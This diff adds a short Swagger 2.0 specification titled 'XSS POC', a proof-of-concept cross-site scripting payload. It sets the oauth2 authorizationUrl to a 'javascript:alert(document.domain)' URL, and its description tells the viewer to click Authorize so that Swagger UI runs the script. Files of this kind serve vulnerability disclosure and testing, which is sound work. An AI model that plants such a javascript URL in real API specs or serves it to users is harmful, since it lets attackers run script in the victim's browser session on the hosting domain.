@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: XSS POC
+  description: 'Click on the Authorize button!'
+paths:
+  /:
+    get:
+      responses:
+        '200':
+          description: Echo GET
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
